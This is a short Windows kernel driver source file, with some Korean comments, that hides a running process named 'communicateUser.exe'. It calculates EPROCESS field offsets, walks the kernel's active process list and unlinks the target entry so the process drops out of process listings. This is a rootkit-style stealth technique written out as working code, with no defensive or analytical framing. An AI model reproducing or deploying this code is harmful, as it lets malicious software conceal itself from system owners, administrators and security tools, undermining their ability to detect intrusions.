#include <ntddk.h>
#include <ntstrsafe.h>
#include "Offset.h"
#include "Hide.h"

extern "C"
static ULONG pidOffset = 0, nameOffset = 0, listEntryOffset = 0;

extern "C"
BOOLEAN InitializeOffsets()
{
	nameOffset = CalcProcessNameOffset();
	pidOffset = CalcPIDOffset();
	listEntryOffset = pidOffset + sizeof(HANDLE);	// LIST_ENTRY

	if (pidOffset == 0 || nameOffset == 0)
		return FALSE;
	else
	{
		DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, "NameOffset Address: 0x%X\n", nameOffset);
		DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, "PID Address: 0x%X\n", pidOffset);
		DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, "ListEntry Address: 0x%X\n", listEntryOffset);
		return TRUE;
	}
}

extern "C"
VOID HideProcess()
{
	PLIST_ENTRY head, currentNode, prevNode;
	PEPROCESS eprocessStart;
	unsigned char* currentProcess = NULL;
	const char target[] = "communicateUser.exe";
	ANSI_STRING targetProcessName, currentProcessName;

	eprocessStart = IoGetCurrentProcess();
	head = currentNode = (PLIST_ENTRY)((unsigned char*)eprocessStart + listEntryOffset);
	RtlInitAnsiString(&targetProcessName, target);

	do
	{
		currentProcess = (unsigned char*)((unsigned char*)currentNode - listEntryOffset);
		RtlInitAnsiString(&currentProcessName, (const char*)((unsigned char*)currentProcess + nameOffset));

		//Target Process인지 확인
		if (RtlCompareString(&targetProcessName, &currentProcessName, TRUE) == 0)
		{
			DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, "Found target process %s.\n", target);

			// TargetProcess
			// (A->B->C->) to (A->C)
			prevNode = currentNode->Blink;
			prevNode->Flink = currentNode->Flink;

			// TargetProcess
			// (A<-B<-C<-) to (A<-C)
			currentNode->Flink->Blink = prevNode;

			// TargetProcess의 링크를 자신으로 변경
			currentNode->Flink = currentNode;
			currentNode->Blink = currentNode;
			break;
		}

		currentNode = currentNode->Flink;
	} while (currentNode->Flink != head);
	// EPROCESS
}
